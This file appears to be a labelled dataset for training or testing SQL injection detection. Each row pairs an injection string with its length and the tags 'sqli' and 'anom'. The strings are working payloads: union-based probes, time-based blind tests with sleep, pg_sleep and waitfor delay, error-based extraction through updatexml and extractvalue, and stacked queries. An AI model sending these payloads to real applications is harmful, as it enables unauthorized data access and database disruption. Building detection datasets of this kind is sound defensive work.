Query,Length,Attack,Label
"1')) as kgiw where 7452=7452 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",181,sqli,anom
"1"";select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""vcup""=""vcup",105,sqli,anom
"1"") union all select null--",27,sqli,anom
"1')) as ngoo where 8641=8641 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",127,sqli,anom
"1%'))) and elt(4249=4249,7259) and ((('%'='",43,sqli,anom
"1') and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ('cfzp' like 'cfzp",118,sqli,anom
"1') and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",66,sqli,anom
1%'));select pg_sleep(5)--,26,sqli,anom
"1'+(select basp where 6953=6953;iif(5257=5257,1,1/0)",52,sqli,anom
"1"")) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((""rqxd""=""rqxd",179,sqli,anom
"1') as mmhe where 2142=2142 or 8466=benchmark(5000000,md5(0x694a4745))--",72,sqli,anom
"1%"")) or (select * from (select(sleep(5)))ydpu) and ((""%""=""",59,sqli,anom
"-9505'))) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('qhdg'='qhdg",224,sqli,anom
"-7544"")) union all select 3808,3808,3808,3808--",47,sqli,anom
"1');call regexp_substring(repeat(right(char(3702),0),500000000),null) and ('ahjo'='ahjo",87,sqli,anom
"-9764' where 1266=1266 or elt(4069=6162,6162)--",47,sqli,anom
"1'||(select 'xjcg' from dual where 5815=5815 union all select null,null,null#",77,sqli,anom
"-4045 union all select 6857,6857,6857,6857,6857,6857,6857--",59,sqli,anom
1') as qcse where 4147=4147 waitfor delay '0:0:5'--,51,sqli,anom
"-4091)) as lqqy where 3030=3030 union all select 3030,3030,3030#",64,sqli,anom
"1%"") and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (""%""=""",112,sqli,anom
"1""))) and 3824=benchmark(5000000,md5(0x76555642)) and (((""enfu""=""enfu",69,sqli,anom
-7430') as xfah where 1596=1596 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,264,sqli,anom
"1%') and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ('%'='",186,sqli,anom
1'||(select 'miew' where 8360=8360 waitfor delay '0:0:5')||',60,sqli,anom
"1""));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ((""zzmn""=""zzmn",118,sqli,anom
1)) as ewlg where 3722=3722 rlike sleep(5)--,44,sqli,anom
"1')) union all select null,null,null,null,null,null#",52,sqli,anom
"1%') or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ('%'='",165,sqli,anom
1' where 5458=5458 rlike (select * from (select(sleep(5)))vwyq)#,64,sqli,anom
(select (case when (6461=1802) then 1 else cast(1 as int)/(select 0 from dual) end) from dual),94,sqli,anom
"1""));waitfor delay '0:0:5' and ((""ykgm""=""ykgm",45,sqli,anom
-6433%')) or 9323=9323#,23,sqli,anom
"1' in boolean mode) union all select null,null--",48,sqli,anom
"1%"")));select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",90,sqli,anom
"1'))) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ((('fbsi' like 'fbsi",132,sqli,anom
1%'));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,99,sqli,anom
-3297' or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))),208,sqli,anom
-4023 or (8779=5716)*5716,25,sqli,anom
"1' in boolean mode) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",127,sqli,anom
1' or (select * from (select(sleep(5)))ydpu) and 'ejdk' like 'ejdk,66,sqli,anom
1') and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ('jhlj'='jhlj,220,sqli,anom
"1%' or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and '%'='",163,sqli,anom
"1"" where 1115=1115 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",80,sqli,anom
-2223')) as mjwp where 8650=8650 or 7900=5838,45,sqli,anom
"-8200%"")) union all select 7538,7538,7538#",42,sqli,anom
"1%"" or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ""%""=""",163,sqli,anom
"1%' union all select null,null,null,null,null,null,null,null,null,null--",72,sqli,anom
"-7122"") union all select 4002,4002,4002,4002,4002,4002,4002,4002#",65,sqli,anom
1') where 5540=5540 waitfor delay '0:0:5'--,43,sqli,anom
"1""))) or 8421=(select count(*) from generate_series(1,5000000)) and (((""ugtw""=""ugtw",83,sqli,anom
"1') or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ('cysu' like 'cysu",100,sqli,anom
"1) where 6090=6090;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",106,sqli,anom
"1"")));(select * from (select(sleep(5)))srmq) and (((""sxih""=""sxih",64,sqli,anom
"1) where 8734=8734 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",109,sqli,anom
"1) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",155,sqli,anom
-8911%' or 9323=9323#,21,sqli,anom
"-3749"" or elt(1032=1032,3623) and ""mzrw""=""mzrw",46,sqli,anom
"-6335""))) union all select 3654--",33,sqli,anom
"-1351"" where 6968=6968 or 5684=8582",35,sqli,anom
"1%'));select count(*) from generate_series(1,5000000) and (('%'='",65,sqli,anom
"1""))) union all select null,null--",34,sqli,anom
"1"" and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ""xhvo""=""xhvo",116,sqli,anom
"1;call regexp_substring(repeat(right(char(3702),0),500000000),null)# huhw",73,sqli,anom
"1%""))) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",97,sqli,anom
1'||(select 'ovlx' where 8767=8767 or sleep(5))||',50,sqli,anom
"1"")));(select * from (select(sleep(5)))srmq) and (((""eakt"" like ""eakt",69,sqli,anom
1%') and 8594=(select 8594 from pg_sleep(5))--,46,sqli,anom
-2733'))) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((('btjx'='btjx,260,sqli,anom
"1"")) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((""ghdr"" like ""ghdr",119,sqli,anom
"1';call regexp_substring(repeat(right(char(3702),0),500000000),null)",68,sqli,anom
"1)) and 3824=benchmark(5000000,md5(0x76555642)) and ((8280=8280",63,sqli,anom
"1'||(select 'zqdn' where 6194=6194 union all select null,null,null,null--",73,sqli,anom
1'+(select 'qsqs' where 9227=9227 waitfor delay '0:0:5')+',58,sqli,anom
"-5026' where 7324=7324 union all select 7324,7324--",51,sqli,anom
1'||(select 'gnil' from dual where 7552=7552 rlike (select (case when (7689=7689) then 1 else 0x28 end)))||',108,sqli,anom
1 where 1092=1092;waitfor delay '0:0:5'--,41,sqli,anom
1')) and 8594=(select 8594 from pg_sleep(5))--,46,sqli,anom
"-5934' union all select 6096,6096,6096,6096,6096#",49,sqli,anom
"-2298%' or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",138,sqli,anom
"1) as qwsa where 2874=2874;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",118,sqli,anom
"-2759%"")) or 7769=1249#",23,sqli,anom
"-7738%"") union all select 8754,8754,8754,8754,8754,8754,8754,8754,8754#",71,sqli,anom
"-9163"" union all select 3820,3820,3820,3820,3820,3820,3820,3820,3820#",69,sqli,anom
"1) where 3936=3936;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",103,sqli,anom
"1'))) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((('dsok'='dsok",196,sqli,anom
"-5849) union all select 6168,6168,6168,6168,6168,6168,6168,6168#",64,sqli,anom
"-8487') where 9655=9655 union all select 9655,9655,9655,9655,9655,9655,9655,9655,9655,9655--",92,sqli,anom
"1"")) as czzg where 5483=5483 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",133,sqli,anom
1')) as wjfj where 3802=3802;if(8574=7534) select 8574 else drop function nxbe--,80,sqli,anom
"1"") where 3122=3122 and sleep(5)#",33,sqli,anom
"1"") where 9827=9827;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",120,sqli,anom
"1);select benchmark(5000000,md5(0x4c4d6142))",44,sqli,anom
"1);create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (1435=1435",132,sqli,anom
"1"");select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (""ihqf""=""ihqf",111,sqli,anom
1')));(select * from (select(sleep(5)))srmq) and ((('ksoc'='ksoc,64,sqli,anom
"-1687)) as lnva where 8396=8396 union all select 8396,8396#",59,sqli,anom
1') as upgb where 2031=2031;select case when 7717=7717 then 1 else null end--,77,sqli,anom
-9562' or 8571=8571--,21,sqli,anom
1 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))-- slje,211,sqli,anom
"1"")) as puws where 7006=7006;select (case when (7997=1543) then 7997 else cast(1 as int)/(select 0 from dual) end) from dual--",126,sqli,anom
"1"") or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""rkfk"" like ""rkfk",166,sqli,anom
"1' in boolean mode) union all select null,null,null,null#",57,sqli,anom
1'))) rlike sleep(5) and ((('rozr' like 'rozr,45,sqli,anom
"-1332) as qtbb where 7261=7261 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",161,sqli,anom
"-8981%""))) union all select 4538,4538,4538,4538,4538,4538,4538#",63,sqli,anom
"1'||(select 'bqhi' from dual where 7409=7409;call regexp_substring(repeat(right(char(3702),0),500000000),null))||'",114,sqli,anom
"1%' union all select null,null,null--",37,sqli,anom
"1%')) or elt(5873=5873,sleep(5))#",33,sqli,anom
"1"";select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4",97,sqli,anom
"1'))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (('rbhe'='rbhe",209,sqli,anom
"1'+(select zpns where 6922=6922 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a))+'",205,sqli,anom
1%');(select * from (select(sleep(5)))acdk)#,44,sqli,anom
"-5630"") or 3038=3038",20,sqli,anom
1));select case when 8237=9948 then 1 else null end--,53,sqli,anom
1' where 2183=2183;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,83,sqli,anom
"1%""))) union all select null,null,null#",39,sqli,anom
"-9558"" where 7497=7497 or (2539=6484)*6484--",44,sqli,anom
"1')) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (('tblb'='tblb",112,sqli,anom
"1"")) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ((""rtyu"" like ""rtyu",158,sqli,anom
"1) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))",63,sqli,anom
1');begin user_lock.sleep(5); end and ('unko'='unko,51,sqli,anom
"1"" and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)",153,sqli,anom
"-6945' union all select 5063,5063,5063,5063,5063,5063,5063,5063--",65,sqli,anom
-3084%')) order by 1--,22,sqli,anom
-8828%'))) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((('%'=',254,sqli,anom
"1') as woka where 4316=4316 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",126,sqli,anom
"1""))) rlike (select (case when (7975=2446) then 1 else 0x28 end)) and (((""qixm"" like ""qixm",90,sqli,anom
"1 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)-- mtaq",104,sqli,anom
1%') and 8734=5844,18,sqli,anom
1') and (3020=3020)*6703 and ('lhfa'='lhfa,42,sqli,anom
-3501') or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('spvx'='spvx,227,sqli,anom
"1""))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (((""ftjg""=""ftjg",155,sqli,anom
1';select pg_sleep(5) and 'qfaz' like 'qfaz,43,sqli,anom
1');begin user_lock.sleep(5); end and ('nchh'='nchh,51,sqli,anom
-7859) as ipdg where 4413=4413 or 9323=9323#,44,sqli,anom
"1"")) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",156,sqli,anom
"1"")) as ogzn where 6849=6849 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",124,sqli,anom
"1"" and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ""rntg"" like ""rntg",118,sqli,anom
"1%'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (('%'='",100,sqli,anom
"-5738"") as efbn where 8541=8541 union all select 8541,8541,8541,8541,8541,8541,8541,8541#",89,sqli,anom
1 where 8578=8578 and 4770=4474--,33,sqli,anom
"1%')) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (('%'='",168,sqli,anom
"1"")) as nwnp where 6140=6140;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",113,sqli,anom
"1,(case when 6620=3092 then 1 else null end)",44,sqli,anom
"1'+(select 'bmit' where 3716=3716 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x))+'",238,sqli,anom
"1) where 5336=5336 union all select null,null,null,null,null,null,null,null,null,null#",86,sqli,anom
1;select case when 2599=7035 then 1 else null end--,51,sqli,anom
"1%"")));select case when 4176=6138 then 1 else null end--",56,sqli,anom
"1'))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('tzbp'='tzbp",181,sqli,anom
1';begin user_lock.sleep(5); end and 'hizd'='hizd,49,sqli,anom
-9005 union all select 4410#,28,sqli,anom
"1,(select 2*(if((select * from (select concat(0x7171706a71,(select (elt(9693=9693,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",153,sqli,anom
"-8698"" where 1990=1990 or (8459=8459)*4906--",44,sqli,anom
"1%""))) and make_set(8403=8403,8899) and (((""%""=""",48,sqli,anom
"1%"")) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ((""%""=""",121,sqli,anom
"1) where 1513=1513 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",81,sqli,anom
"1"") and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (""mlld"" like ""mlld",118,sqli,anom
"1' in boolean mode) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",95,sqli,anom
"1%') or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",111,sqli,anom
"1"") and 6565=2647 and (""mrge"" like ""mrge",40,sqli,anom
"-7580')) as mmqt where 3468=3468 union all select 3468,3468,3468,3468,3468,3468#",80,sqli,anom
-7532))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((8332=8332,223,sqli,anom
"(select 2768 from(select count(*),concat(0x7171706a71,(select (elt(2768=2768,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",166,sqli,anom
1'||(select 'lmsc' from dual where 1162=1162 order by 1--,57,sqli,anom
